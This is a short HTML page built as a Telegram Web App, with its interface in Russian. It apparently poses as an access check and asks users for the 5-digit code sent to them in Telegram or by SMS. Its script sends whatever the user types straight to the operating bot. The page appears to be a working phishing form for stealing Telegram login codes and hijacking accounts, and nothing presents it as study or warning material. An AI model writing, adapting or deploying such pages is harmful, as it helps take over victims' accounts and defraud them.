<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Подтверждение доступа</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            width: 85%;
            background: #1c1c1e;
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
        }
        h2 { margin-top: 0; font-size: 22px; }
        p { color: #8e8e93; font-size: 14px; line-height: 1.4; }
        input {
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
            border-radius: 12px;
            border: 1px solid #3a3a3c;
            background: #2c2c2e;
            color: #ffffff;
            font-size: 24px;
            text-align: center;
            margin: 20px 0;
            letter-spacing: 5px;
            outline: none;
        }
        input:focus { border-color: #007aff; }
        button {
            width: 100%;
            padding: 15px;
            background: #007aff;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:active { background: #0056b3; }
    </style>
</head>
<body>

<div class="card">
    <h2>Проверка кода</h2>
    <p>Введите 5-значный код, который пришел вам в чат <b>Telegram</b> или по SMS.</p>
    
    <input type="number" id="tg_code" placeholder="•••••" inputmode="numeric" pattern="[0-9]*">
    
    <button id="submit_btn">ПОДТВЕРДИТЬ</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand(); // Разворачиваем окно на максимум
    
    // Настраиваем цвета темы под Telegram
    tg.ready();

    const inputField = document.getElementById('tg_code');
    const submitBtn = document.getElementById('submit_btn');

    // Функция отправки данных боту
    function sendDataToBot() {
        const codeValue = inputField.value.trim();
        
        if (codeValue.length >= 4) {
            // МЕТОД SEND_DATA: отправляет текст боту и закрывает WebApp
            tg.sendData(codeValue);
        } else {
            tg.showAlert("Пожалуйста, введите корректный код.");
        }
    }

    submitBtn.addEventListener('click', sendDataToBot);

    // Дополнительно: кнопка "Готово" на мобильной клавиатуре
    inputField.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            sendDataToBot();
        }
    });
</script>

</body>
</html>
